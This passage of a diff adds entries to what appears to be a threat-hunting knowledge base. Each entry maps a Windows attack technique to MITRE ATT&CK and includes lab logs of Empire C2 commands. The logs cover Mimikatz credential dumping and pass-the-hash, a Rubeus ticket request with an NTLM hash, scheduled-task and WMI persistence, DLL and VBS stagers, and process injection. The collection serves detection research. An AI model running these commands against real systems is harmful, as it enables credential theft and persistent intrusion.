http\n3MWPS8L6 ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         7312   5/0.0    2020-09-21 07:12:36  http\n(Empire: agents) > interact 3MWPS8L6\n(Empire: 3MWPS8L6) > usemodule persistence/userland/schtasks\n(Empire: powershell/persistence/userland/schtasks) > info\nName: Invoke-Schtasks\nModule: powershell/persistence/userland/schtasks\nNeedsAdmin: False\nOpsecSafe: False\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: False\nOutputExtension",
+      "metadata": {
+        "doc_id": "SDWIN-190319024742",
+        "id": "SDWIN-190319024742",
+        "title": "Empire Userland Scheduled Tasks",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Local Scheduled Tasks"
+        ],
+        "mitre_ids": [
+          "T1053.005"
+        ],
+        "tactics": [
+          "Persistence"
+        ],
+        "description": "This dataset represents adversaries creating and/or executing local scheduled tasks to maintain persistence in an environment.",
+        "adversary_commands": "(Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http\nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http\nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http\n3MWPS8L6 ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         7312   5/0.0    2020-09-21 07:12:36  http\n(Empire: agents) > interact 3MWPS8L6\n(Empire: 3MWPS8L6) > usemodule persistence/userland/schtasks\n(Empire: powershell/persistence/userland/schtasks) > info\nName: Invoke-Schtasks\nModule: powershell/persistence/userland/schtasks\nNeedsAdmin: False\nOpsecSafe: False\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: False\nOutputExtension",
+        "tools": [
+          "Empire (schtasks)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190319024742.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190319131123": {
+      "id": "SDWIN-190319131123",
+      "document": "Knowledge Doc ID: SDWIN-190319131123\nTitle: Empire Over-Pass-The-Hash\nPlatform: Windows\nTags: Over-Pass-The-Hash, Patching LSASS\nMITRE ATT&CK IDs: T1550.002\nTactics: Defense Evasion, Lateral Movement\nTools: Empire (mimikataz_pth)\nDescription: This dataset represents adversaries taking a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a fully-fledged Kerberos TGT. In this case, an adversary can write the hash/key into an existing logon session (i.e. a sacrificial logon session) section in the memory content of LSASS and kick off the regular Kerberos authentication process.\nAdversary Commands: (Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4EH9PC5S ps 172.18.39.6     WORKSTATION6      *THESHIRE\\wardog        powershell         5056   5/0.0    2020-09-22 02:12:12  http\n(Empire: agents) > interact 4EH9PC5S\n(Empire: 4EH9PC5S) >\n(Empire: 4EH9PC5S) > usemodule credentials/mimikatz/pth*\n(Empire: powershell/credentials/mimikatz/pth) > info\nName: Invoke-Mimikatz PTH\nModule: powershell/credentials/mimikatz/pth\nNeedsAdmin: True\nOpsecSafe: True\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: True\nOutputExtension: None\nAuthors:\n@JosephBialek\n@gentilkiwi\nDescription:\nRuns PowerSploit's Invoke-Mimikatz function to execute\nsekurlsa::pth to create a new process. with a specific\nuser's hash. Use credentials/tokens to steal the token\nafterwards.\nComments:\nhttp://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\nhttp://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-\nhash-with-mimikatz/\nOptions:\n",
+      "metadata": {
+        "doc_id": "SDWIN-190319131123",
+        "id": "SDWIN-190319131123",
+        "title": "Empire Over-Pass-The-Hash",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Over-Pass-The-Hash",
+          "Patching LSASS"
+        ],
+        "mitre_ids": [
+          "T1550.002"
+        ],
+        "tactics": [
+          "Defense Evasion",
+          "Lateral Movement"
+        ],
+        "description": "This dataset represents adversaries taking a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a fully-fledged Kerberos TGT. In this case, an adversary can write the hash/key into an existing logon session (i.e. a sacrificial logon session) section in the memory content of LSASS and kick off the regular Kerberos authentication process.",
+        "adversary_commands": "(Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4EH9PC5S ps 172.18.39.6     WORKSTATION6      *THESHIRE\\wardog        powershell         5056   5/0.0    2020-09-22 02:12:12  http\n(Empire: agents) > interact 4EH9PC5S\n(Empire: 4EH9PC5S) >\n(Empire: 4EH9PC5S) > usemodule credentials/mimikatz/pth*\n(Empire: powershell/credentials/mimikatz/pth) > info\nName: Invoke-Mimikatz PTH\nModule: powershell/credentials/mimikatz/pth\nNeedsAdmin: True\nOpsecSafe: True\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: True\nOutputExtension: None\nAuthors:\n@JosephBialek\n@gentilkiwi\nDescription:\nRuns PowerSploit's Invoke-Mimikatz function to execute\nsekurlsa::pth to create a new process. with a specific\nuser's hash. Use credentials/tokens to steal the token\nafterwards.\nComments:\nhttp://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\nhttp://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-\nhash-with-mimikatz/\nOptions:",
+        "tools": [
+          "Empire (mimikataz_pth)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190319131123.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190319145126": {
+      "id": "SDWIN-190319145126",
+      "document": "Knowledge Doc ID: SDWIN-190319145126\nTitle: Rubeus Userland ASKTGT PTT\nPlatform: Windows\nTags: Over-Pass-The-Hash, Not Touching LSASS\nMITRE ATT&CK IDs: T1003.003\nTactics: Credential Access\nTools: Empire (shell), Rubeus (asktgt)\nDescription: This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs without touching lsass.\nAdversary Commands: (Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4EH9PC5S ps 172.18.39.6     WORKSTATION6      *THESHIRE\\wardog        powershell         5056   5/0.0    2020-09-22 02:12:12  http\n(Empire: agents) > interact 4EH9PC5S\n(Empire: 4EH9PC5S) >\n(Empire: 4EH9PC5S) > shell C:\\users\\sbeavers\\Desktop\\Rubeus.exe asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt\n[*] Tasked 4EH9PC5S to run TASK_SHELL\n[*] Agent 4EH9PC5S tasked with task ID 2\n(Empire: 4EH9PC5S) >\n______        _\n(_____ \\      | |\n_____) )_   _| |__  _____ _   _  ___\n|  __  /| | | |  _ \\| ___ | | | |/___)\n| |  \\ \\| |_| | |_) ) ____| |_| |___ |\n|_|   |_|____/|____/|_____)____/(___/\nv1.5.0\n[*] Action: Ask TGT\n[*] Using rc4_hmac hash: 81d310fa34e6a56a31145445891bb7b8\n[*] Building AS-REQ (w/ preauth) for: 'theshire.local\\pgustavo'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\ndoIFPjCCBTqgAwIBBaEDAgEWooIETTCCBElhggRFMIIEQaADAgEFoR",
+      "metadata": {
+        "doc_id": "SDWIN-190319145126",
+        "id": "SDWIN-190319145126",
+        "title": "Rubeus Userland ASKTGT PTT",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Over-Pass-The-Hash",
+          "Not Touching LSASS"
+        ],
+        "mitre_ids": [
+          "T1003.003"
+        ],
+        "tactics": [
+          "Credential Access"
+        ],
+        "description": "This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs without touching lsass.",
+        "adversary_commands": "(Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4EH9PC5S ps 172.18.39.6     WORKSTATION6      *THESHIRE\\wardog        powershell         5056   5/0.0    2020-09-22 02:12:12  http\n(Empire: agents) > interact 4EH9PC5S\n(Empire: 4EH9PC5S) >\n(Empire: 4EH9PC5S) > shell C:\\users\\sbeavers\\Desktop\\Rubeus.exe asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt\n[*] Tasked 4EH9PC5S to run TASK_SHELL\n[*] Agent 4EH9PC5S tasked with task ID 2\n(Empire: 4EH9PC5S) >\n______        _\n(_____ \\      | |\n_____) )_   _| |__  _____ _   _  ___\n|  __  /| | | |  _ \\| ___ | | | |/___)\n| |  \\ \\| |_| | |_) ) ____| |_| |___ |\n|_|   |_|____/|____/|_____)____/(___/\nv1.5.0\n[*] Action: Ask TGT\n[*] Using rc4_hmac hash: 81d310fa34e6a56a31145445891bb7b8\n[*] Building AS-REQ (w/ preauth) for: 'theshire.local\\pgustavo'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\ndoIFPjCCBTqgAwIBBaEDAgEWooIETTCCBElhggRFMIIEQaADAgEFoR",
+        "tools": [
+          "Empire (shell)",
+          "Rubeus (asktgt)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190319145126.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190403133337": {
+      "id": "SDWIN-190403133337",
+      "document": "Knowledge Doc ID: SDWIN-190403133337\nTitle: IKEEXT Remote Service DLL Hijack\nPlatform: Windows\nTags: Remote Service DLL Hijacking, RPC over SMB Svcctl\nMITRE ATT&CK IDs: T1574.001\nTactics: Persistence, Privilege Escalation, Defense Evasion\nTools: Empire (manual)\nDescription: This dataset represents adversaries copying a file remotely to replace a file which is executed by a service that is vulnerable to DLL hijack. This dataset includes\nAdversary Commands: (Empire: agents) > usestager windows/dll\n(Empire: stager/windows/dll) > info\nName: DLL Launcher\nDescription:\nGenerate a PowerPick Reflective DLL to inject with\nstager code.\nOptions:\nName             Required    Value             Description\n----             --------    -------           -----------\nListener         True        http              Listener to use.\nLanguage         True        powershell        Language of the stager to generate.\nArch             True        x64               Architecture of the .dll to generate\n(x64 or x86).\nStagerRetries    False       0                 Times for the stager to retry\nconnecting.\nUserAgent        False       default           User-agent string to use for the staging\nrequest (default, none, or other).\nProxy            False       default           Proxy to use for request (default, none,\nor other).\nProxyCreds       False       default           Proxy credentials\n([domain\\]username:password) to use for\nrequest (default, none, or other).\nOutFile          True        /tmp/wlbsctrl.dll File to output dll to.\nObfuscate        False       False             Switch. Obfuscate the launcher\npowershell code, uses the\nObfuscateCommand for obfuscati",
+      "metadata": {
+        "doc_id": "SDWIN-190403133337",
+        "id": "SDWIN-190403133337",
+        "title": "IKEEXT Remote Service DLL Hijack",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Remote Service DLL Hijacking",
+          "RPC over SMB Svcctl"
+        ],
+        "mitre_ids": [
+          "T1574.001"
+        ],
+        "tactics": [
+          "Persistence",
+          "Privilege Escalation",
+          "Defense Evasion"
+        ],
+        "description": "This dataset represents adversaries copying a file remotely to replace a file which is executed by a service that is vulnerable to DLL hijack. This dataset includes",
+        "adversary_commands": "(Empire: agents) > usestager windows/dll\n(Empire: stager/windows/dll) > info\nName: DLL Launcher\nDescription:\nGenerate a PowerPick Reflective DLL to inject with\nstager code.\nOptions:\nName             Required    Value             Description\n----             --------    -------           -----------\nListener         True        http              Listener to use.\nLanguage         True        powershell        Language of the stager to generate.\nArch             True        x64               Architecture of the .dll to generate\n(x64 or x86).\nStagerRetries    False       0                 Times for the stager to retry\nconnecting.\nUserAgent        False       default           User-agent string to use for the staging\nrequest (default, none, or other).\nProxy            False       default           Proxy to use for request (default, none,\nor other).\nProxyCreds       False       default           Proxy credentials\n([domain\\]username:password) to use for\nrequest (default, none, or other).\nOutFile          True        /tmp/wlbsctrl.dll File to output dll to.\nObfuscate        False       False             Switch. Obfuscate the launcher\npowershell code, uses the\nObfuscateCommand for obfuscati",
+        "tools": [
+          "Empire (manual)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190403133337.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190518182022": {
+      "id": "SDWIN-190518182022",
+      "document": "Knowledge Doc ID: SDWIN-190518182022\nTitle: Empire VBS Execution\nPlatform: Windows\nTags: VBS Script Execution\nMITRE ATT&CK IDs: T1059.005\nTactics: Execution\nTools: Empire (launcher)\nDescription: This dataset represents adversaries executing a VBS script as a launcher for initial access.\nAdversary Commands: (Empire: listeners) > usestager windows/launcher_vbs\n(Empire: stager/windows/launcher_vbs) > info\nName: VBS Launcher\nDescription:\nGenerates a .vbs launcher for Empire.\nOptions:\nName             Required    Value             Description\n----             --------    -------           -----------\nListener         True                          Listener to generate stager for.\nLanguage         True        powershell        Language of the stager to generate.\nStagerRetries    False       0                 Times for the stager to retry\nconnecting.\nOutFile          False       /tmp/launcher.vbs File to output .vbs launcher to,\notherwise displayed on the screen.\nObfuscate        False       False             Switch. Obfuscate the launcher\npowershell code, uses the\nObfuscateCommand for obfuscation types.\nFor powershell only.\nObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\nOnly used if Obfuscate switch is True.\nFor powershell only.\nUserAgent        False       default           User-agent string to use for the staging\nrequest (default, none, or other).\nProxy            False       default           Proxy to use for request (default, none,\nor other).\nProxy",
+      "metadata": {
+        "doc_id": "SDWIN-190518182022",
+        "id": "SDWIN-190518182022",
+        "title": "Empire VBS Execution",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "VBS Script Execution"
+        ],
+        "mitre_ids": [
+          "T1059.005"
+        ],
+        "tactics": [
+          "Execution"
+        ],
+        "description": "This dataset represents adversaries executing a VBS script as a launcher for initial access.",
+        "adversary_commands": "(Empire: listeners) > usestager windows/launcher_vbs\n(Empire: stager/windows/launcher_vbs) > info\nName: VBS Launcher\nDescription:\nGenerates a .vbs launcher for Empire.\nOptions:\nName             Required    Value             Description\n----             --------    -------           -----------\nListener         True                          Listener to generate stager for.\nLanguage         True        powershell        Language of the stager to generate.\nStagerRetries    False       0                 Times for the stager to retry\nconnecting.\nOutFile          False       /tmp/launcher.vbs File to output .vbs launcher to,\notherwise displayed on the screen.\nObfuscate        False       False             Switch. Obfuscate the launcher\npowershell code, uses the\nObfuscateCommand for obfuscation types.\nFor powershell only.\nObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\nOnly used if Obfuscate switch is True.\nFor powershell only.\nUserAgent        False       default           User-agent string to use for the staging\nrequest (default, none, or other).\nProxy            False       default           Proxy to use for request (default, none,\nor other).\nProxy",
+        "tools": [
+          "Empire (launcher)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190518182022.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190518184306": {
+      "id": "SDWIN-190518184306",
+      "document": "Knowledge Doc ID: SDWIN-190518184306\nTitle: Empire Elevated WMI Eventing\nPlatform: Windows\nTags: Local WMI Eventing, WMI Event Subscriptions\nMITRE ATT&CK IDs: T1546.003\nTactics: Persistence, Privilege Escalation\nTools: Empire (wmi)\nDescription: This dataset represents adversaries leveraging WMI subscriptions locally for persistence.\nAdversary Commands: (Empire: powershell/privesc/bypassuac_fodhelper) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http\nW2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5584   5/0.0    2020-09-04 20:42:01  http\n13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5676   5/0.0    2020-09-04 20:41:59  http\n(Empire: agents) > interact 13ZK6G7M\n(Empire: 13ZK6G7M) >\n(Empire: 13ZK6G7M) > usemodule persistence/elevated/wmi*\n(Empire: powershell/persistence/elevated/wmi) > info\nName: Invoke-WMI\nModule: powershell/persistence/elevated/wmi\nNeedsAdmin: True\nOpsecSafe: False\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: False\nOutputExtension: None\nAuthors:\n@mattifestation\n@harmj0y\n@jbooz1\nDescription:\nPersist a stager (or script) using a permanent WMI\n",
+      "metadata": {
+        "doc_id": "SDWIN-190518184306",
+        "id": "SDWIN-190518184306",
+        "title": "Empire Elevated WMI Eventing",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Local WMI Eventing",
+          "WMI Event Subscriptions"
+        ],
+        "mitre_ids": [
+          "T1546.003"
+        ],
+        "tactics": [
+          "Persistence",
+          "Privilege Escalation"
+        ],
+        "description": "This dataset represents adversaries leveraging WMI subscriptions locally for persistence.",
+        "adversary_commands": "(Empire: powershell/privesc/bypassuac_fodhelper) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http\nW2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5584   5/0.0    2020-09-04 20:42:01  http\n13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5676   5/0.0    2020-09-04 20:41:59  http\n(Empire: agents) > interact 13ZK6G7M\n(Empire: 13ZK6G7M) >\n(Empire: 13ZK6G7M) > usemodule persistence/elevated/wmi*\n(Empire: powershell/persistence/elevated/wmi) > info\nName: Invoke-WMI\nModule: powershell/persistence/elevated/wmi\nNeedsAdmin: True\nOpsecSafe: False\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: False\nOutputExtension: None\nAuthors:\n@mattifestation\n@harmj0y\n@jbooz1\nDescription:\nPersist a stager (or script) using a permanent WMI",
+        "tools": [
+          "Empire (wmi)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190518184306.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190518200432": {
+      "id": "SDWIN-190518200432",
+      "document": "Knowledge Doc ID: SDWIN-190518200432\nTitle: Empire PSInject\nPlatform: Windows\nTags: PE Injection, WriteProcessMemory, CreateRemoteThread Execution\nMITRE ATT&CK IDs: T1055.003\nTactics: Privilege Escalation, Defense Evasion\nTools: Empire (PSInject)\nDescription: This dataset represents adversaries reflectively loading/intecting a portable executable (PE) (not on disk) into a process via WriteprocessMemory and executed via CreateRemoteThread APIs\nAdversary Commands: [*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http\nF82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6008   5/0.0    2020-08-07 18:31:11  http\n(Empire: agents) > interact F82SZKVW\n(Empire: F82SZKVW) >\n(Empire: F82SZKVW) >\n(Empire: F82SZKVW) > usemodule management/psinject\n(Empire: powershell/management/psinject) >\n(Empire: powershell/management/psinject) > set ProcName notepad\n(Empire: powershell/management/psinject) > set Listener http\n(Empire: powershell/management/psinject) > info\nName: Invoke-PSInject\nModule: powershell/management/psinject\nNeedsAdmin: False\nOpsecSafe: True\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: True\nOutputExtension: None\nAuthors:\n@harmj0y\n@sixdub\nleechristensen (@tifkin_)\nDescription:\nUtilizes Powershell to to inject a Stephen Fewer form",
+      "metadata": {
+        "doc_id": "SDWIN-190518200432",
+        "id": "SDWIN-190518200432",
+        "title": "Empire PSInject",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "PE Injection",
+          "WriteProcessMemory",
+          "CreateRemoteThread Execution"
+        ],
+        "mitre_ids": [
+          "T1055.003"
+        ],
+        "tactics": [
+          "Privilege Escalation",
+          "Defense Evasion"
+        ],
+        "description": "This dataset represents adversaries reflectively loading/intecting a portable executable (PE) (not on disk) into a process via WriteprocessMemory and executed via CreateRemoteThread APIs",
+        "adversary_commands": "[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http\nF82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6008   5/0.0    2020-08-07 18:31:11  http\n(Empire: agents) > interact F82SZKVW\n(Empire: F82SZKVW) >\n(Empire: F82SZKVW) >\n(Empire: F82SZKVW) > usemodule management/psinject\n(Empire: powershell/management/psinject) >\n(Empire: powershell/management/psinject) > set ProcName notepad\n(Empire: powershell/management/psinject) > set Listener http\n(Empire: powershell/management/psinject) > info\nName: Invoke-PSInject\nModule: powershell/management/psinject\nNeedsAdmin: False\nOpsecSafe: True\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: True\nOutputExtension: None\nAuthors:\n@harmj0y\n@sixdub\nleechristensen (@tifkin_)\nDescription:\nUtilizes Powershell to to inject a Stephen Fewer form",
+        "tools": [
+          "Empire (PSInject)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190518200432.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190518201207": {
+      "id": "SDWIN-190518201207",
+      "document": "Knowledge Doc ID: SDWIN-190518201207\nTitle: Empire Shell Net Domain Admins\nPlatform: Windows\nTags: Domain Groups Enumeration, RPC SAMR SamrQueryInformationGroup\nMITRE ATT&CK IDs: T1069.002\nTactics: Discovery\nTools: Empire (shell)\nDescription: This dataset represents adversaries enumerating members of domain groups (i.e. Domain Admins) via RPC SAMR interface over SMB. Some of the main RPC methods captured over the network are SamrLookupNamesInDomain (Opnum 17) and SamrQueryInformationGroup (Opnum 20) where there are indicators about the specific group name enumerated.\nAdversary Commands: (Empire: stager/multi/launcher) >\n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n[*] New agent GM4LN8V9 checked in\n[+] Initial agent GM4LN8V9 from 172.18.39.6 now active (Slack)\n[*] Sending agent (stage 2) to GM4LN8V9 at 172.18.39.6\nagents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http\nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http\nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http\nGM4LN8V9 ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         5724   5/0.0    2020-09-21 08:05:25  http\n(Empire: agents) > interact GM4LN8V9\n(Empire: GM4LN8V9) > shell net group \"Domain Admins\" /domain\n[*] Tasked GM4LN8V9 to run TASK_S",
+      "metadata": {
+        "doc_id": "SDWIN-190518201207",
+        "id": "SDWIN-190518201207",
+        "title": "Empire Shell Net Domain Admins",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Domain Groups Enumeration",
+          "RPC SAMR SamrQueryInformationGroup"
+        ],
+        "mitre_ids": [
+          "T1069.002"
+        ],
+        "tactics": [
+          "Discovery"
+        ],
+        "description": "This dataset represents adversaries enumerating members of domain groups (i.e. Domain Admins) via RPC SAMR interface over SMB. Some of the main RPC methods captured over the network are SamrLookupNamesInDomain (Opnum 17) and SamrQueryInformationGroup (Opnum 20) where there are indicators about the specific group name enumerated.",
+        "adversary_commands": "(Empire: stager/multi/launcher) >\n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n[*] New agent GM4LN8V9 checked in\n[+] Initial agent GM4LN8V9 from 172.18.39.6 now active (Slack)\n[*] Sending agent (stage 2) to GM4LN8V9 at 172.18.39.6\nagents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http\nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http\nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http\nGM4LN8V9 ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         5724   5/0.0    2020-09-21 08:05:25  http\n(Empire: agents) > interact GM4LN8V9\n(Empire: GM4LN8V9) > shell net group \"Domain Admins\" /domain\n[*] Tasked GM4LN8V9 to run TASK_S",
+        "tools": [
+          "Empire (shell)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190518201207.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190518201922": {
+      "id": "SDWIN-190518201922",
+      "document": "Knowledge Doc ID: SDWIN-190518201922\nTitle: Empire WDigest Downgrade\nPlatform: Windows\nTags: Registry Modification, Windows Registry WDigest\nMITRE ATT&CK IDs: T1112\nTactics: Defense Evasion\nTools: Empire (wdigest_downgrade)\nDescription: This dataset represents adversaries setting the UseLogonCredential property value from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest key to 1 to enable plain text passwords.\nAdversary Commands: ",
+      "metadata": {
+        "doc_id": "SDWIN-190518201922",
+        "id": "SDWIN-190518201922",
+        "title": "Empire WDigest Downgrade",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Registry Modification",
+          "Windows Registry WDigest"
+        ],
+        "mitre_ids": [
+          "T1112"
+        ],
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "description": "This dataset represents adversaries setting the UseLogonCredential property value from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest key to 1 to enable plain text passwords.",
+        "adversary_commands": "",
+        "tools": [
+          "Empire (wdigest_downgrade)"
+        ],
+        "notebooks": [
+          "WDigest Downgrade (https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190510202010.html)"
+        ],
+        "source_file": "SDWIN-190518201922.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190518202151": {
+      "id": "SDWIN-190518202151",
+      "document": "Knowledge Doc ID: SDWIN-190518202151\nTitle: Empire Mimikatz LogonPasswords\nPlatform: Windows\nTags: LSASS Memory Credentials Read\nMITRE ATT&CK IDs: T1003.001\nTactics: Credential Access\nTools: Empire (credentials)\nDescription: This dataset represents adversaries reading credentials from the memory contents of lsass.exe. One popular tool performing this behavior is Mimikatz.\nAdversary Commands: (Empire: agents) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http\nB7Y8G4XC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         1648   5/0.0    2020-08-07 14:31:46  http\n(Empire: agents) > interact B7Y8G4XC\n(Empire: B7Y8G4XC) >\n(Empire: B7Y8G4XC) > usemodule credentials/mimikatz/logonpasswords*\n(Empire: powershell/credentials/mimikatz/logonpasswords) > info\nName: Invoke-Mimikatz DumpCreds\nModule: powershell/credentials/mimikatz/logonpasswords\nNeedsAdmin: True\nOpsecSafe: True\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: True\nOutputExtension: None\nAuthors:\n@JosephBialek\n@gentilkiwi\nDescription:\nRuns PowerSploit's Invoke-Mimikatz function to extract\nplaintext credentials from memory.\nComments:\nhttp://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\nOptions:\nName  Req",
+      "metadata": {
+        "doc_id": "SDWIN-190518202151",
+        "id": "SDWIN-190518202151",
+        "title": "Empire Mimikatz LogonPasswords",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "LSASS Memory Credentials Read"
+        ],
+        "mitre_ids": [
+          "T1003.001"
+        ],
+        "tactics": [
+          "Credential Access"
+        ],
+        "description": "This dataset represents adversaries reading credentials from the memory contents of lsass.exe. One popular tool performing this behavior is Mimikatz.",
